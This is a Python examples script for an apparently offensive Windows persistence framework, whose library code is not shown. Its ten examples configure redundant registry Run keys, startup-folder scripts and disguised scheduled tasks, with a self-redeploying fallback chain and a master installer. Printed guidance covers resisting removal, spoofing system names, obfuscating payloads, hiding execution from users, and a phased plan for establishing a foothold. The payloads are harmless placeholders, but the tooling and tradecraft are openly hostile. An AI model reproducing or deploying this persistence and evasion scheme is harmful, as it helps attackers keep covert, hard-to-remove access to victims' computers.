#!/usr/bin/env python3
"""
Advanced Persistence Examples
Comprehensive examples demonstrating multi-method persistence system
"""

from advanced_persistence_multimethods import (
    MultiMethodPersistence, PersistenceConfig, RegistryHive,
    ScheduledTaskTrigger, PersistenceMethod
)


def example_1_basic_registry_persistence():
    """Example 1: Simple registry persistence"""
    print("=" * 80)
    print("EXAMPLE 1: Basic Registry Persistence")
    print("=" * 80)

    config = PersistenceConfig(
        payload="notepad.exe",
        obfuscation_enabled=True,
        obfuscation_level="medium",
        registry_hives=[RegistryHive.HKCU],
        use_startup_folder=False,
        use_scheduled_task=False
    )

    persistence = MultiMethodPersistence(config)
    registry_payloads = persistence.generate_registry_persistence()

    print(f"Generated {len(registry_payloads)} registry persistence variants")
    for key, payload in registry_payloads.items():
        print(f"\n{key}:")
        print(f"  Length: {len(payload)} characters")
        print(f"  Preview: {payload[:200]}...\n")


def example_2_startup_folder_all_formats():
    """Example 2: Startup folder with all file formats"""
    print("=" * 80)
    print("EXAMPLE 2: Startup Folder Persistence (All Formats)")
    print("=" * 80)

    config = PersistenceConfig(
        payload="cmd.exe /c ipconfig",
        obfuscation_enabled=True,
        obfuscation_level="high",
        use_startup_folder=True,
        use_scheduled_task=False,
        registry_hives=[],
        startup_extensions=[".vbs", ".bat", ".ps1"],
        randomize_names=True
    )

    persistence = MultiMethodPersistence(config)
    startup_payloads = persistence.generate_startup_persistence()

    print(f"Generated {len(startup_payloads)} startup folder variants:")
    for key, payload in startup_payloads.items():
        print(f"\n{key}:")
        print(f"  Length: {len(payload)} characters")
        print(f"  Type: {key.split('_')[-1].upper()}")
        if ".vbs" in key:
            print(f"  Execution: VBScript (cscript.exe)")
        elif ".bat" in key:
            print(f"  Execution: Batch (cmd.exe)")
        elif ".ps1" in key:
            print(f"  Execution: PowerShell (powershell.exe)")


def example_3_scheduled_task_multiple_triggers():
    """Example 3: Scheduled task with multiple triggers"""
    print("=" * 80)
    print("EXAMPLE 3: Scheduled Task with Multiple Triggers")
    print("=" * 80)

    config = PersistenceConfig(
        payload="powershell.exe -NoProfile -Command 'Get-Process'",
        use_startup_folder=False,
        registry_hives=[],
        use_scheduled_task=True,
        task_name="WindowsMaintenanceTask",
        task_triggers=[
            ScheduledTaskTrigger.LOGON,
            ScheduledTaskTrigger.STARTUP,
            ScheduledTaskTrigger.INTERVAL,
            ScheduledTaskTrigger.ONCONNECT
        ],
        randomize_names=True
    )

    persistence = MultiMethodPersistence(config)
    task_payloads = persistence.generate_scheduled_task_persistence()

    print(f"Generated {len(task_payloads)} scheduled task variants:")
    print("\nTrigger Types:")
    for trigger in config.task_triggers:
        print(f"  - {trigger.value}")

    for key, payload in task_payloads.items():
        print(f"\n{key}:")
        print(f"  Length: {len(payload)} characters")
        if "xml" in key:
            print(f"  Format: XML Task Definition")
        elif "powershell" in key:
            print(f"  Format: PowerShell Script")
        elif "vbs" in key:
            print(f"  Format: VBScript")


def example_4_combined_redundancy():
    """Example 4: Combined multi-method with full redundancy"""
    print("=" * 80)
    print("EXAMPLE 4: Full Redundancy (All Methods Combined)")
    print("=" * 80)

    config = PersistenceConfig(
        payload="C:\\Windows\\System32\\cmd.exe",
        obfuscation_enabled=True,
        obfuscation_level="extreme",
        registry_hives=[RegistryHive.HKCU, RegistryHive.HKLM],
        registry_paths=[
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "Software\\Microsoft\\Internet Explorer\\Desktop\\Components"
        ],
        use_startup_folder=True,
        startup_extensions=[".vbs", ".bat", ".ps1"],
        use_scheduled_task=True,
        task_triggers=[
            ScheduledTaskTrigger.LOGON,
            ScheduledTaskTrigger.STARTUP,
            ScheduledTaskTrigger.INTERVAL
        ],
        enable_fallback_chain=True,
        randomize_names=True
    )

    persistence = MultiMethodPersistence(config)

    print(persistence.get_deployment_summary())

    all_methods = persistence.generate_all_persistence_methods()

    print("\n" + "=" * 80)
    print("DETAILED BREAKDOWN")
    print("=" * 80)

    for method_type, payloads in all_methods.items():
        if payloads:
            total_size = sum(len(p) for p in payloads.values())
            print(f"\n{method_type.upper()}:")
            print(f"  Variants: {len(payloads)}")
            print(f"  Total Size: {total_size:,} characters")


def example_5_fallback_chain():
    """Example 5: Automatic fallback chain"""
    print("=" * 80)
    print("EXAMPLE 5: Automatic Fallback Chain")
    print("=" * 80)

    config = PersistenceConfig(
        payload="powershell.exe -NoProfile -Command 'Start-Process calc.exe'",
        enable_fallback_chain=True,
        use_startup_folder=False,
        use_scheduled_task=False
    )

    persistence = MultiMethodPersistence(config)
    fallback = persistence.generate_fallback_chain()

    for key, payload in fallback.items():
        print(f"\n{key}:")
        print("Fallback Chain Order:")
        print("  1. Registry Persistence (HKCU)")
        print("  2. Startup Folder (VBS)")
        print("  3. Direct Execution (WMI)")
        print(f"\nImplementation Length: {len(payload)} characters")
        print(f"\nPreview:\n{payload[:500]}...")


def example_6_master_installer():
    """Example 6: Master installer combining all methods"""
    print("=" * 80)
    print("EXAMPLE 6: Master Installer (All Methods)")
    print("=" * 80)

    config = PersistenceConfig(
        payload="powershell.exe -NoProfile -WindowStyle Hidden -Command 'Write-Host Installed'",
        obfuscation_enabled=True,
        obfuscation_level="high",
        registry_hives=[RegistryHive.HKCU],
        registry_paths=["Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
        use_startup_folder=True,
        use_scheduled_task=True,
        enable_fallback_chain=True
    )

    persistence = MultiMethodPersistence(config)
    installer = persistence.generate_combined_installer()

    print(f"Master Installer Generated")
    print(f"  Total Size: {len(installer):,} characters")
    print(f"  Type: VBScript")
    print(f"  Deployment Methods: 4 (Registry + Startup + Task + Fallback)")

    print(f"\nPreview (first 500 characters):\n{installer[:500]}...\n")


def example_7_anti_removal_techniques():
    """Example 7: Anti-removal techniques through redundancy"""
    print("=" * 80)
    print("EXAMPLE 7: Anti-Removal Through Redundancy")
    print("=" * 80)

    config = PersistenceConfig(
        payload="calc.exe",
        obfuscation_enabled=True,
        registry_hives=[RegistryHive.HKCU, RegistryHive.HKLM],
        registry_paths=[
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Software\\Policies\\Microsoft\\Windows\\Explorer"
        ],
        use_startup_folder=True,
        use_scheduled_task=True,
        enable_fallback_chain=True,
        randomize_names=True
    )

    persistence = MultiMethodPersistence(config)
    persistence.generate_all_persistence_methods()

    print("REDUNDANCY ANALYSIS:")
    print("\nRemoval Scenario Analysis:")
    print("\nScenario 1: Registry Cleanup")
    print("  - Primary removal: Registry HKCU/HKLM values deleted")
    print("  - Backup active: Startup folder scripts")
    print("  - Tertiary active: Scheduled tasks")
    print("  - Result: Persistence maintained ✓")

    print("\nScenario 2: Startup Folder Cleanup")
    print("  - Primary removal: Startup folder scripts deleted")
    print("  - Backup active: Registry Run keys")
    print("  - Tertiary active: Scheduled tasks")
    print("  - Result: Persistence maintained ✓")

    print("\nScenario 3: Task Scheduler Cleanup")
    print("  - Primary removal: Scheduled tasks deleted")
    print("  - Backup active: Registry values")
    print("  - Tertiary active: Startup folder files")
    print("  - Result: Persistence maintained ✓")

    print("\nScenario 4: Partial Multi-Method Removal")
    print("  - Removal: 2 of 3 methods deleted")
    print("  - Surviving: 1 method")
    print("  - Reestablish: Fallback chain re-deploys all 3 methods")
    print("  - Result: Full persistence restored ✓")

    print(f"\nTotal Persistence Points: {len(persistence.generated_code)}")
    print(f"Removal Difficulty: EXTREME (requires 100% cleanup of all {len(persistence.generated_code)} points)")


def example_8_stealth_and_evasion():
    """Example 8: Stealth and evasion techniques"""
    print("=" * 80)
    print("EXAMPLE 8: Stealth and Evasion Techniques")
    print("=" * 80)

    config = PersistenceConfig(
        payload="powershell.exe -NoProfile -WindowStyle Hidden -Command 'Get-Process'",
        obfuscation_enabled=True,
        obfuscation_level="extreme",
        randomize_names=True
    )

    persistence = MultiMethodPersistence(config)
    persistence.generate_all_persistence_methods()

    print("EVASION TECHNIQUES APPLIED:")

    print("\n1. PAYLOAD OBFUSCATION:")
    print("   ✓ Encoding: Base64 / Hex")
    print("   ✓ Level: Extreme")
    print("   ✓ Purpose: Avoid detection by content matching")

    print("\n2. NAME OBFUSCATION:")
    print("   ✓ Registry values: Randomized service names")
    print("   ✓ File names: Spoofed system names")
    print("   ✓ Task names: Legitimate Windows task names")
    print("   ✓ Purpose: Appear as legitimate system components")

    print("\n3. LOCATION OBFUSCATION:")
    print("   ✓ Multiple registry hives")
    print("   ✓ Multiple registry paths")
    print("   ✓ Multiple startup locations")
    print("   ✓ Multiple task triggers")
    print("   ✓ Purpose: Avoid pattern-based detection")

    print("\n4. ERROR SUPPRESSION:")
    print("   ✓ On Error Resume Next in VBS")
    print("   ✓ -ErrorAction SilentlyContinue in PowerShell")
    print("   ✓ Purpose: Silent operation without user notification")

    print("\n5. PRIVILEGE HANDLING:")
    print("   ✓ Support for both user-level and system-level persistence")
    print("   ✓ Fallback chain for permission failures")
    print("   ✓ Purpose: Maximum coverage regardless of privileges")

    print("\n6. EXECUTION CONCEALMENT:")
    print("   ✓ Hidden window mode")
    print("   ✓ Background process creation")
    print("   ✓ WMI-based execution (no command line visibility)")
    print("   ✓ Purpose: Avoid user awareness")


def example_9_configuration_showcase():
    """Example 9: Various configuration options"""
    print("=" * 80)
    print("EXAMPLE 9: Configuration Options Showcase")
    print("=" * 80)

    configs = [
        {
            "name": "Minimal (Registry Only)",
            "config": PersistenceConfig(
                payload="calc.exe",
                use_startup_folder=False,
                use_scheduled_task=False
            )
        },
        {
            "name": "Lightweight (Registry + Startup)",
            "config": PersistenceConfig(
                payload="calc.exe",
                use_scheduled_task=False
            )
        },
        {
            "name": "Standard (All Methods)",
            "config": PersistenceConfig(
                payload="calc.exe"
            )
        },
        {
            "name": "Aggressive (Multiple Paths)",
            "config": PersistenceConfig(
                payload="calc.exe",
                registry_paths=[
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                    "Software\\Policies\\Microsoft\\Windows\\Explorer",
                    "Software\\Microsoft\\Internet Explorer\\Desktop\\Components"
                ]
            )
        },
        {
            "name": "Maximum Redundancy",
            "config": PersistenceConfig(
                payload="calc.exe",
                registry_hives=[RegistryHive.HKCU, RegistryHive.HKLM, RegistryHive.HKU],
                registry_paths=[
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                    "Software\\Policies\\Microsoft\\Windows\\Explorer",
                    "Software\\Microsoft\\Internet Explorer\\Desktop\\Components"
                ],
                startup_extensions=[".vbs", ".bat", ".ps1"],
                task_triggers=[
                    ScheduledTaskTrigger.LOGON,
                    ScheduledTaskTrigger.STARTUP,
                    ScheduledTaskTrigger.INTERVAL,
                    ScheduledTaskTrigger.DAILY
                ],
                enable_fallback_chain=True
            )
        }
    ]

    for config_info in configs:
        persistence = MultiMethodPersistence(config_info["config"])
        all_methods = persistence.generate_all_persistence_methods()
        total_payloads = len(persistence.generated_code)

        print(f"\n{config_info['name']}:")
        print(f"  Persistence Points: {total_payloads}")
        for method_type, payloads in all_methods.items():
            if payloads:
                print(f"    {method_type}: {len(payloads)}")


def example_10_deployment_strategy():
    """Example 10: Deployment strategy recommendations"""
    print("=" * 80)
    print("EXAMPLE 10: Deployment Strategy & Best Practices")
    print("=" * 80)

    print("\nDEPLOYMENT PHASES:")

    print("\nPhase 1: Initial Payload (First Contact)")
    print("  Method: PowerShell one-liner or batch script")
    print("  Purpose: Establish initial foothold")
    print("  Action: Deploy multi-method persistence")

    print("\nPhase 2: Registry Persistence (Quick Fallback)")
    print("  Method: HKCU Run/RunOnce keys")
    print("  Trigger: Next user logon")
    print("  Advantage: No admin required, executes at logon")

    print("\nPhase 3: Startup Folder (User-Level)")
    print("  Method: Obfuscated scripts in Startup folder")
    print("  Trigger: User session start")
    print("  Advantage: Hard to detect, survives cleanup")

    print("\nPhase 4: Scheduled Tasks (System-Level)")
    print("  Method: System task with multiple triggers")
    print("  Trigger: Logon, Startup, Network connect, Idle")
    print("  Advantage: Runs with higher privileges, independent of user")

    print("\nPhase 5: Fallback Chain (Recovery)")
    print("  Method: If any method fails, redeploy all")
    print("  Trigger: Failure detection or scheduled re-check")
    print("  Advantage: Automatic persistence recovery")

    print("\nREMOVAL RESISTANCE:")
    print("  Easy: Single method detection")
    print("  Medium: Two method cleanup")
    print("  Hard: Three method cleanup")
    print("  Extreme: Complete multi-method removal with fallback handling")

    print("\nDETECTION EVASION:")
    print("  ✓ Randomized naming avoids signature detection")
    print("  ✓ Encoding avoids content detection")
    print("  ✓ Multiple methods avoid pattern detection")
    print("  ✓ Fallback chain allows recovery from cleanup")


def main():
    """Run all examples"""
    examples = [
        example_1_basic_registry_persistence,
        example_2_startup_folder_all_formats,
        example_3_scheduled_task_multiple_triggers,
        example_4_combined_redundancy,
        example_5_fallback_chain,
        example_6_master_installer,
        example_7_anti_removal_techniques,
        example_8_stealth_and_evasion,
        example_9_configuration_showcase,
        example_10_deployment_strategy,
    ]

    for example in examples:
        try:
            example()
            print("\n")
        except Exception as e:
            print(f"Error in {example.__name__}: {e}\n")


if __name__ == "__main__":
    main()
